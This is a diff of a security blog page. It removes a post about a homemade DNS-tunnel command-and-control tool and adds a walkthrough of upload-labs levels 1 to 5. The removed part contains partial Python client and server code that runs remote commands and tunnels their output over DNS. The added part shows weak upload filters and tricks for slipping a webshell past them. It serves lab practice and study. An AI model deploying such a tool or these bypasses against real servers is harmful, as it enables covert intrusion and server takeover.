@@ -2,9 +2,9 @@
 <html>
 <head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="utf-8">
-  <title>一个很像cxk的dns_c2 | 九世的博客</title>
-  <meta name="keywords" content=" Writing ">
-  <meta name="description" content="一个很像cxk的dns_c2 | 九世的博客">
+  <title>upload-master level 1 - level 5 | 九世的博客</title>
+  <meta name="keywords" content=" 靶场练习 ">
+  <meta name="description" content="upload-master level 1 - level 5 | 九世的博客">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="Become a hacker">
 <meta property="og:type" content="website">
@@ -1066,9 +1066,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-一个很像cxk的dns-c2" class="article article-type-post" itemscope="" itemprop="blogPost">
+        <article id="post-upload-master-level-1-level-5" class="article article-type-post" itemscope="" itemprop="blogPost">
     
-        <h1 class="article-title">一个很像cxk的dns_c2</h1>
+        <h1 class="article-title">upload-master level 1 - level 5</h1>
     
     <div class="article-meta">
         
@@ -1077,14 +1077,14 @@
         
         <span class="tag">
             
-            <a href="javascript:" class="color3">Writing</a>
+            <a href="javascript:" class="color5">靶场练习</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title="更新时间: 2019-05-02 23:14:50">2019-05-02 21:11</time>
+        创建时间:<time class="date" title="更新时间: 2019-10-06 19:30:20">2019-10-06 18:55</time>
         
     </div>
     <div class="article-meta">
@@ -1106,7 +1106,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#思路"><span class="toc-text">思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#实现他"><span class="toc-text">实现他</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#测试截图"><span class="toc-text">测试截图</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#正文"><span class="toc-text">正文</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -1121,189 +1121,185 @@
 </div>
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>算是一个很像cxk的东西，有个BUG一直解决不了<br>而且还时不时的像报错。。。。emmmm<br><img src="http://img4.imgtn.bdimg.com/it/u=1940277742,2702113996&amp;fm=26&amp;gp=0.jpg" alt=""></p>
-<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>五一之前在sec-wiki看到某文章<br>传送门:<a href="https://www.cnblogs.com/LittleHann/p/8656621.html" target="_blank" rel="noopener">DNS Tunnel隧道隐蔽通信实验 &amp;&amp; 尝试复现特征向量化思维方式检测</a><br>根据文章所描述的，我这个c2应该属于第一种</p>
-<p>我在写之前上GitHub搜了一下dns shell找到了一个不错的项目<br>传送门:<a href="https://github.com/ahhh/Reverse_DNS_Shell/" target="_blank" rel="noopener">DNS_Shell</a></p>
-<p>根据上面项目所用到的东西</p>
-<pre><code class="`">dnslib模块 --- 处理dns包
-dnspython --- 发送dns请求
-</code></pre>
-<p>当然你也可以用scapy手动构造一个dns的数据包然后在发送出去….</p>
-<p>项目里面接收dns包的时候是用socket创建一个UDP，然后监听53端口，监听数据<br>获取到的数据使用dnslib，模块进行解包便可获得想要的数据</p>
-<p>dns_shell算是个反向shell，必须由客户端发送请求。服务端回应该数据<br>虽然写的时候有点困难。我是实现第一种c2，使用的是TXT记录类型。TXT类型有限制数据不能大于63个字节<br>所以必须得分段发送</p>
-<h2 id="实现他"><a href="#实现他" class="headerlink" title="实现他"></a>实现他</h2><p><b>Server端</b><br>解dns包的函数</p>
-<pre><code class="python">    def dnsj(self,data):
-        dr=dnslib.DNSRecord.parse(data) #dns数据包转换
-        answer=dr.reply() #获取全部数据
-        return answer,dr.questions[0].qname.label[0] #获取请求前的dns包和指定数据
-</code></pre>
-<p>打包为dns包的函数</p>
-<pre><code class="python">    def dnsc(self,answer,data):
-        answer.add_answer(*dnslib.RR.fromZone(&#39;{}.com 60 TXT&#39;.format(data)))
-        return answer
-</code></pre>
-<p>主要函数</p>
-<pre><code class="python"> global s,address
-        he = [&#39;cmd---&gt;命令行交互&#39;,&#39;upload---&gt;文件上传&#39;,&#39;download---&gt;文件下载&#39;,&#39;exit---&gt;退出&#39;]
-        hps={&#39;cmd&#39;: self.cmd,&#39;upload&#39;:self.upload,&#39;download&#39;:self.download,&#39;exit&#39;:exit}
-        s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
-        s.bind((self.host,int(self.port)))
-        data,address=s.recvfrom(1024)
-        print(&#39;[+] 来源IP:{},来源端口:{}&#39;.format(address[0],address[1]))
-        dnsj=self.dnsj(data)
-        demo=self.jiemi(dnsj[1])
-        if demo:
-            print(&#39;[+] {}:{}&lt;----&gt;{}:{}&#39;.format(self.host,self.port,address[0],address[1]))
-            print(&#39;+请执行你的操作，如果有问题请输入help&#39;)
-            demos=self.jiami(&#39;demo&#39;)
-            fs=self.dnsc(dnsj[0],demos)
-            s.sendto(fs.pack(),address)
-            while True:
-                xw=input(&#39;Jarvis:&#39;)
-                if xw in hps:
-                    try:
-                        hps[xw]()
-                    except Exception as r:
-                        print(&#39;-- Error:{}&#39;.format(r))
-                elif xw==&#39;help&#39;:
-                    print(&#39;&#39;)
-                    for h in he:
-                        print(h)
-                else:
-                    print(&#39;-没有这种操作&#39;)
-                    continue
-</code></pre>
-<p><b>Client端</b><br>主要函数</p>
-<pre><code class="python"> def beikon(self):
-        hk={&#39;cmd&#39;:self.cmd,&#39;upload&#39;:self.upload,&#39;download&#39;:self.download}
-        demo=&#39;demo&#39;
-        demo=self.jiami(demo)
-        bbc=self.fs(demo)
-        kk=self.zz(bbc)
-        jm=self.jiemi(kk.encode(&#39;utf-8&#39;))
-        if jm:
-            while True:
-                try:
-                    g=&#39;ok&#39;
-                    demo = self.jiami(g)
-                    bbc = self.fs(demo)
-                    kk = self.zz(bbc)
-                    jm = self.jiemi(kk.encode(&#39;utf-8&#39;))
-                    if jm in hk:
-                        hk[jm]()
-                except:
-                    pass
-</code></pre>
-<p><b>对应功能对照的函数</b><br>命令行交互<br>server端</p>
-<pre><code class="python"> def cmd(self):
-        self.ok(&#39;cmd&#39;)
-        while True:
-            jb, jc = s.recvfrom(1024)
-            dnsj = self.dnsj(jb)
-            demo = self.jiemi(dnsj[1])
-            if demo!=&#39;cmd&#39; and demo !=&#39;long&#39;:
-                print(demo)
-                demos = self.jiami(&#39;cmd&#39;)
-                fs = self.dnsc(dnsj[0], demos)
-                s.sendto(fs.pack(), jc)
-            elif demo==&#39;long&#39;:
-                changdu=0
-                jg=b&#39;&#39;
-                demos = self.jiami(&#39;long&#39;)
-                fs = self.dnsc(dnsj[0], demos)
-                s.sendto(fs.pack(), jc)
+        <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=138922&auto=1&height=66"></iframe>
 
-                c,d= s.recvfrom(1024)
-                dnsj = self.dnsj(c)
-                demo=self.jiemi(dnsj[1])
-                if str(demo).isdigit()==True:
-                    changdu+=int(demo)
-                print(changdu)
-                demos = self.jiami(&#39;{}&#39;.format(changdu))
-                fs = self.dnsc(dnsj[0], demos)
-                s.sendto(fs.pack(), d)
-                while True:
-                    d,e = s.recvfrom(1024)
-                    dnsj = self.dnsj(d)
-                    jg+=dnsj[1]
-                    if len(jg)==changdu:
-                        jmk=self.jiemi(jg)
-                        print(jmk)
-                        fs = self.dnsc(dnsj[0], &#39;break&#39;)
-                        s.sendto(fs.pack(), e)
-                        break
-                    demos = self.jiami(&#39;jx&#39;)
-                    fs = self.dnsc(dnsj[0], demos)
-                    s.sendto(fs.pack(), e)
-
-            else:
-                shell=input(&#39;Jarvis_shell:&#39;)
-                if shell==&#39;exit&#39;:
-                    demos = self.jiami(&#39;exit&#39;)
-                    fs = self.dnsc(dnsj[0], demos)
-                    s.sendto(fs.pack(), jc)
-                    break
-                demos = self.jiami(shell)
-                fs = self.dnsc(dnsj[0], demos)
-                s.sendto(fs.pack(), jc)
-
-
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>搭建了几个靶场来玩，之前在网上看见有人在做upload-master。那么也下载个来试试水温</p>
+<p><img src="https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1570369525327&amp;di=f44b51aebdcf8e9635ea8f1bedb1cf41&amp;imgtype=0&amp;src=http%3A%2F%2Fpics5.baidu.com%2Ffeed%2F42166d224f4a20a4bdad30040aeaf427700ed084.png%3Ftoken%3D2f0f162ecb1f3db9aa8a858d31df7d95%26s%3DD228B345D871148EAE8270F303009028" alt=""></p>
+<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p> 仓库地址：</p>
+<p><a href="https://github.com/c0ny1/upload-labs" target="_blank" rel="noopener">https://github.com/c0ny1/upload-labs</a></p>
+<p>自己创建一个upload的文件夹</p>
+<p><img src="https://s2.ax1x.com/2019/10/06/ucze1g.png" alt=""></p>
+<p><strong>level 1</strong></p>
+<p>第一题是js验证，代码如下</p>
+<pre><code class="php">&lt;?php
+function checkFile() {
+    var file = document.getElementsByName(&#39;upload_file&#39;)[0].value;
+    if (file == null || file == &quot;&quot;) {
+        alert(&quot;请选择要上传的文件!&quot;);
+        return false;
+    }
+    //定义允许上传的文件类型
+    var allow_ext = &quot;.jpg|.png|.gif&quot;;
+    //提取上传文件的类型
+    var ext_name = file.substring(file.lastIndexOf(&quot;.&quot;));
+    //判断上传文件类型是否允许上传
+    if (allow_ext.indexOf(ext_name + &quot;|&quot;) == -1) {
+        var errMsg = &quot;该文件不允许上传，请上传&quot; + allow_ext + &quot;类型的文件,当前文件类型为：&quot; + ext_name;
+        alert(errMsg);
+        return false;
+    }
+}    
+?&gt;
 </code></pre>
-<p>client端</p>
-<pre><code class="python">    def cmd(self):
-        while True:
-            g=&#39;cmd&#39;
-            demo = self.jiami(g)
-            bbc = self.fs(demo)
-            kk = self.zz(bbc)
-            jm = self.jiemi(kk.encode(&#39;utf-8&#39;))
-            if jm == &#39;exit&#39;:
-                break
-            else:
-                zx=os.popen(jm)
-                if zx:
-                    g=zx.read()
-                    demos = self.jiami(g)
-                    if len(demos)&lt;64:
-                        if len(demos)==0:
-                            demos=self.jiami(jm)
-                        bbc = self.fs(demos)
-                        kk = self.zz(bbc)
-                        jm = self.jiemi(kk.encode(&#39;utf-8&#39;))
-                        if jm:
-                            continue
-                    else:
-                        g=&#39;long&#39;
-                        demo = self.jiami(g)
-                        bbc = self.fs(demo)
-                        kk = self.zz(bbc)
-                        jm = self.jiemi(kk.encode(&#39;utf-8&#39;))
-                        if jm:
-                            g = len(demos)
-                            demo = self.jiami(g)
-                            bbc = self.fs(demo)
-                            kk = self.zz(bbc)
-                            jm = self.jiemi(kk.encode(&#39;utf-8&#39;))
-                            if jm:
-                                b=0
-                                e=32
-                                for u in demos:
-                                    g=demos[b:e]
-                                    b+=32
-                                    e+=32
-                                    bbc=self.fs(g)
-                                    kk = self.zz(bbc)
-                                    if kk==&#39;break&#39;:
-                                        break
+<p>从html中发现端详</p>
+<p><img src="https://s2.ax1x.com/2019/10/06/uczMBn.png" alt=""></p>
+<p>将马子改后缀为jpg然后上传的时候burp抓包将后缀改回php</p>
+<p><img src="https://s2.ax1x.com/2019/10/06/uczwH1.png" alt=""></p>
+<p><strong>level 2</strong></p>
+<p>第二天是判断<code>Content-Type</code>头，代码如下：</p>
+<pre><code class="php">&lt;?php
+$is_upload = false;
+$msg = null;
+if (isset($_POST[&#39;submit&#39;])) {
+    if (file_exists(UPLOAD_PATH)) {
+        if (($_FILES[&#39;upload_file&#39;][&#39;type&#39;] == &#39;image/jpeg&#39;) || ($_FILES[&#39;upload_file&#39;][&#39;type&#39;] == &#39;image/png&#39;) || ($_FILES[&#39;upload_file&#39;][&#39;type&#39;] == &#39;image/gif&#39;)) {
+            $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];
+            $img_path = UPLOAD_PATH . &#39;/&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;]            
+            if (move_uploaded_file($temp_file, $img_path)) {
+                $is_upload = true;
+            } else {
+                $msg = &#39;上传出错！&#39;;
+            }
+        } else {
+            $msg = &#39;文件类型不正确，请重新上传！&#39;;
+        }
+    } else {
+        $msg = UPLOAD_PATH.&#39;文件夹不存在,请手工创建！&#39;;
+    }
+}
 
+ ?&gt;
 </code></pre>
-<p><b>仓库地址</b>:<a href="https://github.com/422926799/python/tree/master/dns_c2" target="_blank" rel="noopener">https://github.com/422926799/python/tree/master/dns_c2</a></p>
-<h2 id="测试截图"><a href="#测试截图" class="headerlink" title="测试截图"></a>测试截图</h2><p><img src="https://s2.ax1x.com/2019/05/02/ENMlz4.gif" alt=""></p>
-<p><img src="https://s2.ax1x.com/2019/05/02/ENM8y9.gif" alt=""></p>
-<p><img src="https://s2.ax1x.com/2019/05/02/ENMGLR.gif" alt=""></p>
-<p><img src="https://s2.ax1x.com/2019/05/02/ENMYe1.gif" alt=""></p>
-<p><b>抓包截图</b><br><img src="https://s2.ax1x.com/2019/05/02/ENMtdx.gif" alt=""></p>
-<p>转载请声明:转自422926799.github.io</p>
+<p>可以和上一题一样进行上传，或者直接上传php，然后把头改为<code>Contenet-Type: image/png</code></p>
+<p><img src="https://s2.ax1x.com/2019/10/06/uczwH1.png" alt=""></p>
+<p><img src="https://s2.ax1x.com/2019/10/06/ucz78S.png" alt=""></p>
+<p><strong>level 3</strong></p>
+<p>第三题是黑名单检测</p>
+<pre><code class="php">&lt;?
+ $is_upload = false;
+$msg = null;
+if (isset($_POST[&#39;submit&#39;])) {
+    if (file_exists(UPLOAD_PATH)) {
+        $deny_ext = array(&#39;.asp&#39;,&#39;.aspx&#39;,&#39;.php&#39;,&#39;.jsp&#39;);
+        $file_name = trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);
+        $file_name = deldot($file_name);//删除文件名末尾的点
+        $file_ext = strrchr($file_name, &#39;.&#39;);
+        $file_ext = strtolower($file_ext); //转换为小写
+        $file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA
+        $file_ext = trim($file_ext); //收尾去空
+
+        if(!in_array($file_ext, $deny_ext)) {
+            $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];
+            $img_path = UPLOAD_PATH.&#39;/&#39;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;            
+            if (move_uploaded_file($temp_file,$img_path)) {
+                 $is_upload = true;
+            } else {
+                $msg = &#39;上传出错！&#39;;
+            }
+        } else {
+            $msg = &#39;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#39;;
+        }
+    } else {
+        $msg = UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;;
+    }
+}
+
+ php?&gt;
+</code></pre>
+<p>这里有几个操作</p>
+<ul>
+<li>使用windows下会自动删除的字符，例如::$DATA或.</li>
+<li>上传.htacess，设置指定名称来解析为php</li>
+<li>上传其他名称，如:php1,php2,php3,php5,php32,phtml</li>
+<li>00截断</li>
+</ul>
+<p><img src="https://s2.ax1x.com/2019/10/06/ugSlKH.png" alt=""></p>
+<p><strong>level 4</strong></p>
+<p>第四题也是黑名单，代码如下</p>
+<pre><code class="php">&lt;?php
+$is_upload = false;
+$msg = null;
+if (isset($_POST[&#39;submit&#39;])) {
+    if (file_exists(UPLOAD_PATH)) {
+        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;php1&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;pHp1&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;);
+        $file_name = trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);
+        $file_name = deldot($file_name);//删除文件名末尾的点
+        $file_ext = strrchr($file_name, &#39;.&#39;);
+        $file_ext = strtolower($file_ext); //转换为小写
+        $file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA
+        $file_ext = trim($file_ext); //收尾去空
+
+        if (!in_array($file_ext, $deny_ext)) {
+            $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];
+            $img_path = UPLOAD_PATH.&#39;/&#39;.$file_name;
+            if (move_uploaded_file($temp_file, $img_path)) {
+                $is_upload = true;
+            } else {
+                $msg = &#39;上传出错！&#39;;
+            }
+        } else {
+            $msg = &#39;此文件不允许上传!&#39;;
+        }
+    } else {
+        $msg = UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;;
+    }
+}
+
+?&gt;
+</code></pre>
+<p>上传.htaccess来设置解析</p>
+<p><img src="https://s2.ax1x.com/2019/10/06/ugSBrj.png" alt="image"></p>
+<p>上传一个名为dd.jpg的马子即可</p>
+<p><img src="https://s2.ax1x.com/2019/10/06/ugpVyQ.png" alt=""></p>
+<p>参考链接：</p>
+<p><a href="https://www.cnblogs.com/hmbb/p/9689436.html" target="_blank" rel="noopener">https://www.cnblogs.com/hmbb/p/9689436.html</a></p>
+<p><strong>level 5</strong></p>
+<p>这题还是黑名单，但是把.htaccess禁用了</p>
+<pre><code class="php">&lt;?php
+$is_upload = false;
+$msg = null;
+if (isset($_POST[&#39;submit&#39;])) {
+    if (file_exists(UPLOAD_PATH)) {
+        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);
+        $file_name = trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);
+        $file_name = deldot($file_name);//删除文件名末尾的点
+        $file_ext = strrchr($file_name, &#39;.&#39;);
+        $file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA
+        $file_ext = trim($file_ext); //首尾去空
+
+        if (!in_array($file_ext, $deny_ext)) {
+            $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];
+            $img_path = UPLOAD_PATH.&#39;/&#39;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;
+            if (move_uploaded_file($temp_file, $img_path)) {
+                $is_upload = true;
+            } else {
+                $msg = &#39;上传出错！&#39;;
+            }
+        } else {
+            $msg = &#39;此文件类型不允许上传！&#39;;
+        }
+    } else {
+        $msg = UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;;
+    }
+}
+
+?&gt;
+</code></pre>
+<p>由于这里它把PHP漏掉了也没转换大小写，所以上传一个<code>test.PHP</code>即可</p>
+<p><img src="https://s2.ax1x.com/2019/10/06/ugPDpV.md.png" alt=""></p>
+<p><img src="https://s2.ax1x.com/2019/10/06/ugPcm4.png" alt=""></p>
+<p>靶场给出的一个文件上传总结</p>
+<p><img src="https://s2.ax1x.com/2019/10/06/ugPb0H.png" alt=""></p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
@@ -1313,12 +1309,12 @@ dnspython --- 发送dns请求
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>一个很像cxk的dns_c2</p>
+    <p><span class="copy-title">文章标题:</span>upload-master level 1 - level 5</p>
     
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="九世">九世</a></p>
-    <p><span class="copy-title">发布时间:</span>2019-05-02, 21:11:11</p>
-    <p><span class="copy-title">最后更新:</span>2019-05-02, 23:14:50</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/126651c2.html" title="一个很像cxk的dns_c2">http://422926799.github.io/posts/126651c2.html</a>
+    <p><span class="copy-title">发布时间:</span>2019-10-06, 18:55:09</p>
+    <p><span class="copy-title">最后更新:</span>2019-10-06, 19:30:20</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/ed8edd7e.html" title="upload-master level 1 - level 5">http://422926799.github.io/posts/ed8edd7e.html</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
